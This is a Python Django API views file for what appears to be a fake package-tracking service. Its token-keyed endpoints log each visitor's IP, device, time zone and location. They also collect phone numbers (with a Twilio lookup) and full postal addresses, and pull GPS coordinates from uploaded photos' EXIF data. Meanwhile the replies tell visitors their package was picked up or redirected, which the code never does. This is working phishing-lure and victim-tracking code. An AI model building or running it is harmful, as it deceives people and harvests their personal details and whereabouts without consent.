import base64
import json
import logging

from datetime import datetime
from typing import Any
from typing import Optional
from api.serializers import AddressSerializer
from api.serializers import ImageUploadSerializer
from api.serializers import NotificationSerializer
from api.serializers import RequestSerializer
from api.serializers import TrackingDataSerializer
from common.api_clients import PostGridApiClient
from common.api_clients import TwilioApiClient
from common.api_types import HeaderData
from common.api_types import IpData
from common.api_types import LocaleData
from common.api_types import LocationData
from common.api_types import TimeData
from common.api_types import TwilioLookupResponse
from common.api_types import UserAgentData
from common.functions import get_ip_data
from common.functions import get_locale_data
from common.functions import get_location_data
from common.functions import get_time_data
from common.functions import get_user_agent_data
from django.conf import settings
from django.shortcuts import get_object_or_404
from django.utils import timezone
from PIL import Image
from PIL.ExifTags import GPSTAGS
from PIL.ExifTags import TAGS
from rest_framework import mixins
from rest_framework import status
from rest_framework.decorators import action
from rest_framework.permissions import AllowAny
from rest_framework.request import Request
from rest_framework.response import Response
from rest_framework.viewsets import GenericViewSet
from tracking.models import ExifData
from tracking.models import ImageData
from tracking.models import InterceptionData
from tracking.models import NotificationData
from tracking.models import Token
from tracking.models import Tracking
from tracking.models import TrackingData


logger = logging.getLogger(__name__)


def _parse_exif_tag(tag: Any, value: Any, exif_data: dict[str, Any]) -> None:  # noqa: C901
    """Parse a single EXIF tag and update exif_data dictionary."""
    tag_str = str(tag)
    if tag_str == "Make":
        exif_data["make"] = str(value) if value else None
    elif tag_str == "Model":
        exif_data["model"] = str(value) if value else None
    elif tag_str == "Software":
        exif_data["software"] = str(value) if value else None
    elif tag_str == "Orientation":
        exif_data["orientation"] = int(value) if value else None
    elif tag_str == "ExposureTime":
        exif_data["exposure_time"] = str(value) if value else None
    elif tag_str == "FNumber":
        exif_data["f_number"] = float(value) if value else None
    elif tag_str == "ISOSpeedRatings":
        exif_data["iso_speed"] = int(value) if value else None
    elif tag_str == "FocalLength":
        exif_data["focal_length"] = float(value) if value else None
    elif tag_str == "Flash":
        exif_data["flash"] = bool(value) if value is not None else None
    elif tag_str == "DateTimeOriginal":
        try:
            exif_data["datetime_original"] = datetime.strptime(str(value), "%Y:%m:%d %H:%M:%S")
        except (ValueError, TypeError):
            pass
    elif tag_str == "DateTimeDigitized":
        try:
            exif_data["datetime_digitized"] = datetime.strptime(str(value), "%Y:%m:%d %H:%M:%S")
        except (ValueError, TypeError):
            pass


def _parse_gps_data(gps_info: dict, exif_data: dict[str, Any], raw_exif: dict[str, Any]) -> None:
    """Parse GPS data from EXIF and update exif_data dictionary."""
    for key, val in gps_info.items():
        gps_tag = GPSTAGS.get(key, key)
        raw_exif[f"GPS_{gps_tag}"] = val

    lat = gps_info.get(2)  # GPSLatitude
    lat_ref = gps_info.get(1)  # GPSLatitudeRef
    lon = gps_info.get(4)  # GPSLongitude
    lon_ref = gps_info.get(3)  # GPSLongitudeRef
    alt = gps_info.get(6)  # GPSAltitude

    if lat and lon:
        lat_decimal = float(lat[0]) + float(lat[1]) / 60.0 + float(lat[2]) / 3600.0
        if lat_ref == "S":
            lat_decimal = -lat_decimal
        exif_data["latitude"] = lat_decimal

        lon_decimal = float(lon[0]) + float(lon[1]) / 60.0 + float(lon[2]) / 3600.0
        if lon_ref == "W":
            lon_decimal = -lon_decimal
        exif_data["longitude"] = lon_decimal

    if alt:
        exif_data["altitude"] = float(alt)


def extract_exif_data(image_file: Any) -> dict[str, Any]:
    """
    Extract EXIF data from an uploaded image file.

    Args:
        image_file: The uploaded image file (InMemoryUploadedFile or similar)

    Returns:
        Dictionary containing extracted EXIF data fields
    """
    exif_data: dict[str, Any] = {}

    try:
        image = Image.open(image_file)
        exif_data["width"] = image.width
        exif_data["height"] = image.height

        exif_dict = image.getexif()
        if not exif_dict:
            return exif_data

        raw_exif: dict[str, Any] = {}

        for tag_id, value in exif_dict.items():
            tag = TAGS.get(tag_id, tag_id)
            raw_exif[str(tag)] = str(value) if not isinstance(value, (int, float, bool)) else value
            _parse_exif_tag(tag, value, exif_data)

        gps_info = exif_dict.get(34853)  # GPSInfo tag
        if gps_info:
            _parse_gps_data(gps_info, exif_data, raw_exif)

        exif_data["raw_exif_data"] = raw_exif
        image_file.seek(0)

    except Exception as e:
        logger.warning(f"Error extracting EXIF data: {e}")
        if hasattr(image_file, "seek"):
            image_file.seek(0)

    return exif_data


class BaseTrackingView(GenericViewSet):
    """Base class for tracking views with common header data parsing functionality."""

    NO_HEADER_ERROR = {"detail": "Could not determin header data"}

    def getHeaderData(self, request: Request) -> Optional[HeaderData]:
        """Extract and parse X-Tracking-Payload header from request.

        Args:
            request: The HTTP request object

        Returns:
            HeaderData object if header is present and valid, None otherwise
        """
        header_value = request.headers.get("X-Tracking-Payload")

        if not header_value:
            logger.debug("No X-Tracking-Payload header found")
            return None

        try:
            # Decode base64 and parse JSON
            decoded_bytes = base64.b64decode(header_value)
            decoded_str = decoded_bytes.decode("utf-8")
            payload: HeaderData = HeaderData(**json.loads(decoded_str))
            logger.debug("X-Tracking-Payload header parsed successfully")
            return payload
        except (ValueError, json.JSONDecodeError) as e:
            logger.warning(f"Invalid headers: {e}")
            return None

    def getTokenAndTrackingData(
        self, request: Request, serializer: Any, no_token_error: dict[str, str]
    ) -> (
        tuple[
            Token,
            Tracking,
            HeaderData,
            str,
            IpData,
            UserAgentData,
            LocaleData,
            TimeData,
            LocationData,
        ]
        | Response
    ):
        """Validate serializer, get token/tracking, validate header data, extract http_method,
        get all tracking data, and update token last_used.

        Args:
            request: The HTTP request object
            serializer: The serializer instance to validate
            no_token_error: Error response dict to return if validation fails

        Returns:
            Tuple of (token_obj, tracking, header_data, http_method, ip_data, user_agent_data,
            locale_data, time_data, location_data) if successful,
            or Response with error if validation fails
        """
        if not serializer.is_valid(raise_exception=True):
            return Response(no_token_error, status=status.HTTP_400_BAD_REQUEST)

        token_value = serializer.validated_data["token"]
        http_method = serializer.validated_data.get("method", request.method)
        token_obj = get_object_or_404(Token, value=token_value)
        tracking = token_obj.tracking
        header_data: Optional[HeaderData] = self.getHeaderData(request)

        if not header_data:
            return Response(self.NO_HEADER_ERROR, status=status.HTTP_400_BAD_REQUEST)

        # Get IP data
        ip_data: IpData = get_ip_data(request, header_data)

        # Get user agent data
        user_agent_data: UserAgentData = get_user_agent_data(request, header_data)

        # Get locale data
        locale_data: LocaleData = get_locale_data(request, header_data)

        # Get time data
        time_data: TimeData = get_time_data(header_data, ip_data)

        # Get location data
        location_data: LocationData = get_location_data(header_data, ip_data)

        # Update token last_used
        token_obj.last_used = timezone.now()
        token_obj.save(update_fields=["last_used"])

        return (
            token_obj,
            tracking,
            header_data,
            http_method,
            ip_data,
            user_agent_data,
            locale_data,
            time_data,
            location_data,
        )


class PackagesView(BaseTrackingView, mixins.CreateModelMixin, GenericViewSet):
    lookup_field = "token"
    queryset = TrackingData.objects.all()
    serializer_class = TrackingDataSerializer
    permission_classes = [AllowAny]

    NO_HEADER_ERROR = {"detail": "Could not determin header data"}
    NO_TOKEN_ERROR = {"detail": "Token is required"}
    NO_TOKEN_OR_PHONE_ERROR = {"detail": "Token and phone number are required"}

    @action(
        detail=False,
        methods=["post"],
        url_path="notify",
        url_name="notify",
        serializer_class=NotificationSerializer,
    )
    def notify(self, request: Request) -> Response:
        serializer = NotificationSerializer(data=request.data)
        result = self.getTokenAndTrackingData(request, serializer, self.NO_TOKEN_OR_PHONE_ERROR)

        if isinstance(result, Response):
            return result

        (
            token_obj,
            tracking,
            header_data,
            http_method,
            ip_data,
            user_agent_data,
            locale_data,
            time_data,
            location_data,
        ) = result

        phone = serializer.validated_data["phone"]
        # Handle notifications if provided
        twilio_client: TwilioApiClient = TwilioApiClient(
            settings.TWILIO_ACCOUNT_SID, settings.TWILIO_AUTH_TOKEN
        )
        phone_data: Optional[TwilioLookupResponse] = twilio_client.get_data(phone)

        # Create tracking data
        NotificationData.objects.create(
            tracking=tracking,
            token=token_obj,
            http_method=http_method,
            ip_address=ip_data.getSelectedAddress(),
            ip_source=ip_data.source,
            os=user_agent_data.get_os_name(),
            browser=user_agent_data.get_browser_name(),
            platform=user_agent_data.get_platform_type(),
            locale=locale_data.selected,
            client_time=time_data.info,
            client_timezone=time_data.getTimezone(),
            latitude=location_data.getLatitude(),
            longitude=location_data.getLongitude(),
            location_source=location_data.source,
            _ip_data=ip_data.model_dump(),
            _user_agent_data=user_agent_data.model_dump(),
            _header_data=header_data.model_dump(),
            _form_data=request.data,
            _phone_data=phone_data.model_dump() if phone_data else None,
        )

        return Response(
            {
                "status": "success",
                "detail": "✅ Package updates will be sent to your phone.",
            },
            status=status.HTTP_201_CREATED,
        )

    @action(
        detail=False,
        methods=["post"],
        url_path="track",
        url_name="track",
        serializer_class=RequestSerializer,
    )
    def track(self, request: Request) -> Response:
        serializer = RequestSerializer(data=request.data)
        result = self.getTokenAndTrackingData(request, serializer, self.NO_TOKEN_ERROR)

        if isinstance(result, Response):
            return result

        (
            token_obj,
            tracking,
            header_data,
            http_method,
            ip_data,
            user_agent_data,
            locale_data,
            time_data,
            location_data,
        ) = result

        # Create tracking data
        TrackingData.objects.create(
            tracking=tracking,
            token=token_obj,
            http_method=http_method,
            ip_address=ip_data.getSelectedAddress(),
            ip_source=ip_data.source,
            os=user_agent_data.get_os_name(),
            browser=user_agent_data.get_browser_name(),
            platform=user_agent_data.get_platform_type(),
            locale=locale_data.selected,
            client_time=time_data.info,
            client_timezone=time_data.getTimezone(),
            latitude=location_data.getLatitude(),
            longitude=location_data.getLongitude(),
            location_source=location_data.source,
            _ip_data=ip_data.model_dump(),
            _user_agent_data=user_agent_data.model_dump(),
            _header_data=header_data.model_dump(),
            _form_data=request.data,
        )

        return Response(
            {
                "status": "success",
                "detail": "✅ Your package was picked up by a local carrier. It may take a few hours to arrive at the sorting facility.",
            },
            status=status.HTTP_201_CREATED,
        )

    @action(
        detail=False,
        methods=["post"],
        url_path="intercept",
        url_name="intercept",
        serializer_class=AddressSerializer,
    )
    def intercept(self, request: Request) -> Response:
        serializer = AddressSerializer(data=request.data)
        result = self.getTokenAndTrackingData(request, serializer, self.NO_TOKEN_ERROR)

        if isinstance(result, Response):
            return result

        (
            token_obj,
            tracking,
            header_data,
            http_method,
            ip_data,
            user_agent_data,
            locale_data,
            time_data,
            location_data,
        ) = result

        # Prepare address data for PostGrid API
        address_payload = {
            "recipient": serializer.validated_data.get("recipient", ""),
            "line1": serializer.validated_data.get("line1", ""),
            "line2": serializer.validated_data.get("line2", ""),
            "city": serializer.validated_data.get("city", ""),
            "province": serializer.validated_data.get("provinceOrState", ""),
            "State": serializer.validated_data.get("provinceOrState", ""),
            "postalOrZip": serializer.validated_data.get("postalOrZip", ""),
            "country": serializer.validated_data.get("country", ""),
        }

        # Verify address using PostGrid API
        postgrid_client: PostGridApiClient = PostGridApiClient(settings.POSTGRID_AUTH_TOKEN)
        address_data = postgrid_client.verify_address(address_payload)

        if not address_data:
            return Response(
                {
                    "status": "error",
                    "detail": "Failed to verify address. Please try again later.",
                },
                status=status.HTTP_500_INTERNAL_SERVER_ERROR,
            )

        # Create tracking data
        InterceptionData.objects.create(
            tracking=tracking,
            token=token_obj,
            http_method=http_method,
            ip_address=ip_data.getSelectedAddress(),
            ip_source=ip_data.source,
            os=user_agent_data.get_os_name(),
            browser=user_agent_data.get_browser_name(),
            platform=user_agent_data.get_platform_type(),
            locale=locale_data.selected,
            client_time=time_data.info,
            client_timezone=time_data.getTimezone(),
            latitude=location_data.getLatitude(),
            longitude=location_data.getLongitude(),
            location_source=location_data.source,
            _ip_data=ip_data.model_dump(),
            _user_agent_data=user_agent_data.model_dump(),
            _header_data=header_data.model_dump(),
            _form_data=request.data,
            recipient_name=serializer.validated_data.get("recipient", ""),
            street_address_line_1=serializer.validated_data.get("line1", ""),
            street_address_line_2=serializer.validated_data.get("line2", ""),
            city=serializer.validated_data.get("city", ""),
            state_province=serializer.validated_data.get("provinceOrState", ""),
            postal_code=serializer.validated_data.get("postalOrZip", ""),
            country=serializer.validated_data.get("country", ""),
            _address_data=address_data.model_dump() if address_data else None,
        )

        # Prepare response based on verification result
        if address_data.data and address_data.data.errors:
            return Response(
                {
                    "status": "warning",
                    "detail": "Address verification completed with warnings.",
                    "verification": {
                        "status": address_data.data.status,
                        "verified_address": {
                            "line1": address_data.data.line1,
                            "line2": address_data.data.line2,
                            "city": address_data.data.city,
                            "provinceOrState": address_data.data.province_or_state,
                            "postalOrZip": address_data.data.postal_or_zip,
                            "country": address_data.data.country,
                        },
                        "errors": address_data.data.errors,
                    },
                },
                status=status.HTTP_200_OK,
            )

        return Response(
            {
                "status": "success",
                "detail": "✅ A request was sent to redirect your package. Please check your phone for updates we have sent you.",
            },
            status=status.HTTP_201_CREATED,
        )


class ImageReviewView(BaseTrackingView, mixins.CreateModelMixin, GenericViewSet):
    """ViewSet for image review and EXIF data uploads."""

    lookup_field = "token"
    queryset = ExifData.objects.all()
    serializer_class = ImageUploadSerializer
    permission_classes = [AllowAny]

    NO_HEADER_ERROR = {"detail": "Could not determin header data"}
    NO_TOKEN_ERROR = {"detail": "Token is required"}

    @action(
        detail=False,
        methods=["post"],
        url_path="upload",
        url_name="upload",
        serializer_class=ImageUploadSerializer,
    )
    def upload(self, request: Request) -> Response:
        """Handle image upload with EXIF data extraction."""
        serializer = ImageUploadSerializer(data=request.data)
        result = self.getTokenAndTrackingData(request, serializer, self.NO_TOKEN_ERROR)

        if isinstance(result, Response):
            return result

        (
            token_obj,
            tracking,
            header_data,
            http_method,
            ip_data,
            user_agent_data,
            locale_data,
            time_data,
            location_data,
        ) = result

        image_file = serializer.validated_data["image"]

        # Extract EXIF data from the image
        exif_extracted = extract_exif_data(image_file)

        # Prepare form data for JSON storage (exclude file objects)
        form_data_dict: dict[str, Any] = {}
        for key, value in request.data.items():
            # Skip file objects as they can't be serialized to JSON
            if hasattr(value, "read"):
                form_data_dict[key] = str(value.name) if hasattr(value, "name") else "file"
            else:
                form_data_dict[key] = value

        # Use EXIF GPS coordinates if available, otherwise use location_data
        latitude = exif_extracted.get("latitude") or location_data.getLatitude()
        longitude = exif_extracted.get("longitude") or location_data.getLongitude()
        location_source = "EXIF" if exif_extracted.get("latitude") else location_data.source

        # Extract and cast EXIF string fields
        make_val: Optional[str] = exif_extracted.get("make")
        model_val: Optional[str] = exif_extracted.get("model")
        software_val: Optional[str] = exif_extracted.get("software")
        exposure_time_val: Optional[str] = exif_extracted.get("exposure_time")

        # Create EXIF data record with extracted EXIF data
        ExifData.objects.create(
            tracking=tracking,
            token=token_obj,
            image=image_file,
            http_method=http_method,
            ip_address=ip_data.getSelectedAddress(),
            ip_source=ip_data.source,
            os=user_agent_data.get_os_name(),
            browser=user_agent_data.get_browser_name(),
            platform=user_agent_data.get_platform_type(),
            locale=locale_data.selected,
            client_time=time_data.info,
            client_timezone=time_data.getTimezone(),
            latitude=latitude,
            longitude=longitude,
            location_source=location_source,
            # EXIF-specific fields
            altitude=exif_extracted.get("altitude"),
            make=make_val,  # type: ignore
            model=model_val,
            software=software_val,
            width=exif_extracted.get("width"),
            height=exif_extracted.get("height"),
            orientation=exif_extracted.get("orientation"),
            datetime_original=exif_extracted.get("datetime_original"),
            datetime_digitized=exif_extracted.get("datetime_digitized"),
            exposure_time=exposure_time_val,
            f_number=exif_extracted.get("f_number"),
            iso_speed=exif_extracted.get("iso_speed"),
            focal_length=exif_extracted.get("focal_length"),
            flash=exif_extracted.get("flash"),
            raw_exif_data=exif_extracted.get("raw_exif_data"),
            _ip_data=ip_data.model_dump(),
            _user_agent_data=user_agent_data.model_dump(),
            _header_data=header_data.model_dump(),
            _form_data=form_data_dict,
        )

        return Response(
            {
                "status": "success",
                "detail": "✅ Image uploaded successfully. EXIF data will be extracted and stored.",
            },
            status=status.HTTP_201_CREATED,
        )

    @action(
        detail=False,
        methods=["post"],
        url_path="track",
        url_name="track",
        serializer_class=RequestSerializer,
    )
    def track(self, request: Request) -> Response:
        """Handle image tracking data."""
        serializer = RequestSerializer(data=request.data)
        result = self.getTokenAndTrackingData(request, serializer, self.NO_TOKEN_ERROR)

        if isinstance(result, Response):
            return result

        (
            token_obj,
            tracking,
            header_data,
            http_method,
            ip_data,
            user_agent_data,
            locale_data,
            time_data,
            location_data,
        ) = result

        # Create image tracking data
        ImageData.objects.create(
            tracking=tracking,
            token=token_obj,
            http_method=http_method,
            ip_address=ip_data.getSelectedAddress(),
            ip_source=ip_data.source,
            os=user_agent_data.get_os_name(),
            browser=user_agent_data.get_browser_name(),
            platform=user_agent_data.get_platform_type(),
            locale=locale_data.selected,
            client_time=time_data.info,
            client_timezone=time_data.getTimezone(),
            latitude=location_data.getLatitude(),
            longitude=location_data.getLongitude(),
            location_source=location_data.source,
            _ip_data=ip_data.model_dump(),
            _user_agent_data=user_agent_data.model_dump(),
            _header_data=header_data.model_dump(),
            _form_data=request.data,
        )

        return Response(
            {
                "status": "success",
                "detail": "✅ Image tracking data recorded successfully.",
            },
            status=status.HTTP_201_CREATED,
        )
